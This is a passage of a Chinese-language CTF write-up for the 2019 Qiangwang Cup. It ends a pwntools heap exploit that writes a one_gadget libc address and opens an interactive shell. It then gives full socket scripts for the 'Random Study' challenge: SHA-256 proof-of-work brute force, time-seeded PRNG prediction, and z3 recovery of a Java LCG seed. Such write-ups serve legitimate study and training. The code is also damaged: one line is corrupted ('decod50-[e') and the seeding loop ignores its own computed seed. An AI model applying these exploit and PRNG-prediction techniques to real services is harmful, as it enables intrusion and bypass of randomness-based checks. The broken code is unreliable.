    CHANGE<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeefdeadbeef</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x45216</span><span class="token operator">+</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># one_gadget</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;&gt;&gt;&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;2&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span>

    attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br></div></div><p><img src="/assets/img/2019-qwb-4.2d78ff45.png" alt="pwn"></p> <h2 id="random-study"><a href="#random-study" class="header-anchor">#</a> Random Study</h2> <p>Random study 共有四个阶段的题目。</p> <ul><li>初始阶段是告知 8 位随机字符串的 sha256 值，然后告知其中的前 5 位，给出整个字符串的 hex 值。</li> <li>第一个阶段是根据当前时间的秒数随机种种子，然后生成随机数，在 200 次机会内填写正确。</li> <li>第二个阶段是产生两个随机数，然后只有一次机会猜测第三个随机数。</li> <li>第三个阶段是产生 32bit 的随机字符串，然后在 200 次机会内填写正确。</li></ul> <h3 id="初始阶段"><a href="#初始阶段" class="header-anchor">#</a> 初始阶段</h3> <p>针对初始阶段，可以直接拿三字节随机数进行碰撞，代码：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#建立连接</span>
sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'119.3.245.36'</span><span class="token punctuation">,</span><span class="token number">23456</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#接收初始验证的内容</span>
line1 <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>line1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
line2 <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token comment">#分割data获取skr的sha256</span>
skr_sha256 <span class="token operator">=</span> line2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#分割data获取skr的前5字节的hex值</span>
skr_part1_hex <span class="token operator">=</span> line2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#解析skr的数据</span>
skr_part1 <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>skr_part1_hex<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>skr_part1<span class="token punctuation">)</span>
<span class="token comment">#直接拿三个字节的随机数和skr_part1拼接碰撞sha256</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    skr_part2 <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    skr_test <span class="token operator">=</span> skr_part1 <span class="token operator">+</span> skr_part2
    skr_test_sha256 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>skr_test<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> skr_test_sha256 <span class="token operator">==</span> skr_sha256<span class="token punctuation">:</span>
        skr  <span class="token operator">=</span> skr_test
        <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>skr<span class="token punctuation">)</span>
<span class="token comment">#将skr转换为16进制编码</span>
skr_hex <span class="token operator">=</span> codecs<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>skr<span class="token punctuation">,</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
<span class="token comment">#发送结果</span>
sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>skr_hex <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><h3 id="第一阶段"><a href="#第一阶段" class="header-anchor">#</a> 第一阶段</h3> <p>针对第一个阶段，可以在连接服务器时在上下 100 秒内尝试种子是否正确，代码：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#获取初始阶段的结束信息</span>
line <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
<span class="token comment">#发送teamtoken</span>
teamtoken <span class="token operator">=</span> <span class="token string">b'71e9f731afee608322aa0928f44ac7ce'</span>
sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>teamtoken <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
<span class="token comment">#实际连的时候有时候服务器会抽抽，所以就不断接受一直到第一阶段开始</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b'[+]Generating challenge 1'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span class="token comment">#将初始时间设置为当前机器的100秒之前</span>
time_start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">100</span>
<span class="token comment">#逐秒往后碰撞，知道碰对</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    time_assume <span class="token operator">=</span> time_start <span class="token operator">+</span> i
    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        test <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b'[++++++++++++++++]challenge 1 completed[++++++++++++++++]'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[++++++++++++++++]challenge 1 completed[++++++++++++++++]'</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><h3 id="第二阶段"><a href="#第二阶段" class="header-anchor">#</a> 第二阶段</h3> <p>针对第二个阶段，在研究 Java 生成随机数原理后，了解了 nextInt 是通过线性同余来计算下一个种子的。于是可以利用 z3 进行线性约束，求出生成前两个随机数的种子，代码如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>
    seed <span class="token operator">=</span> BitVec<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">)</span>
    nextseed <span class="token operator">=</span> <span class="token punctuation">(</span>seed<span class="token operator">*</span><span class="token number">0x5DEECE66D</span> <span class="token operator">+</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__and__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    one <span class="token operator">=</span> nextseed<span class="token punctuation">.</span>__rshift__<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
    nextseed <span class="token operator">=</span> <span class="token punctuation">(</span>nextseed<span class="token operator">*</span><span class="token number">0x5DEECE66D</span> <span class="token operator">+</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__and__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    two <span class="token operator">=</span> nextseed<span class="token punctuation">.</span>__rshift__<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
    solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>BV2Int<span class="token punctuation">(</span>one<span class="token punctuation">)</span> <span class="token operator">==</span> value1<span class="token punctuation">)</span><span class="token comment">#1649034553)</span>
    solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>BV2Int<span class="token punctuation">(</span>two<span class="token punctuation">)</span> <span class="token operator">==</span> value2<span class="token punctuation">)</span><span class="token comment">#623604550)</span>
    <span class="token keyword">if</span> solver<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>
        m <span class="token operator">=</span> solver<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> m<span class="token punctuation">[</span>seed<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>利用线性同余计算出种子后，再使用 Java 来生成第三个随机数（由于 Pytho 中右移是和符号相关的，即 Python 中每右移一位就会除以 2，而 Java 随机数生成机制是与符号无关的，即 Java 生成随机数的右移操作会将内存中的数据直接进行右移操作，因此此处使用 Java 编写）</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Compute</span> <span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token class-name">String</span> seed_string <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> seed <span class="token operator">=</span> <span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>seed_string<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">longValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">long</span> nextseed <span class="token operator">=</span> <span class="token punctuation">(</span>seed<span class="token operator">*</span><span class="token number">25214903917L</span> <span class="token operator">+</span> <span class="token number">0</span>xbL<span class="token punctuation">)</span><span class="token punctuation">;</span>
		nextseed <span class="token operator">=</span> nextseed <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1L</span> <span class="token operator">&lt;&lt;</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		nextseed <span class="token operator">=</span> <span class="token punctuation">(</span>nextseed<span class="token operator">*</span><span class="token number">0</span>x5DEECE66DL <span class="token operator">+</span> <span class="token number">0</span>xbL<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1L</span> <span class="token operator">&lt;&lt;</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		nextseed <span class="token operator">=</span> <span class="token punctuation">(</span>nextseed<span class="token operator">*</span><span class="token number">0</span>x5DEECE66DL <span class="token operator">+</span> <span class="token number">0</span>xbL<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1L</span> <span class="token operator">&lt;&lt;</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> three <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>nextseed <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>three<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>随后，再使用 socket 发送生成结果：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b'[-]'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span class="token keyword">if</span> <span class="token string">b'[+]failed\n'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># data = sock.recv(1024)</span>
<span class="token comment"># print(data)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    value1 <span class="token operator">=</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'[-]'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    value2 <span class="token operator">=</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'[-]'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Value1 :'</span><span class="token punctuation">,</span>value1<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Value2 :'</span><span class="token punctuation">,</span>value2<span class="token punctuation">)</span>
    value1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>value1<span class="token punctuation">)</span>
    value2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>value2<span class="token punctuation">)</span>
    seed <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">)</span>
    <span class="token keyword">if</span> seed <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Value3 failed.'</span><span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'1\n'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b'[-]'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
value3 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;java&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Compute&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Value3:'</span><span class="token punctuation">,</span>value3<span class="token punctuation">)</span>
sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>value3 <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><h3 id="第三阶段"><a href="#第三阶段" class="header-anchor">#</a> 第三阶段</h3> <p>实际上，题目中第一关和第三关的随机数都是使用 Random 库进行生成的。而在第一关中已经种过一次种子，因此第一关通过的话直接拿来生成第三关的随机数就可以通过，代码如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">b'[+]Generating challenge 3'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decod50<span class="token operator">-</span><span class="token punctuation">[</span>e<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">b'[-]'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
target_num <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
target <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target_num<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b'[++++++++++++++++]challenge 3 completed[++++++++++++++++]'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
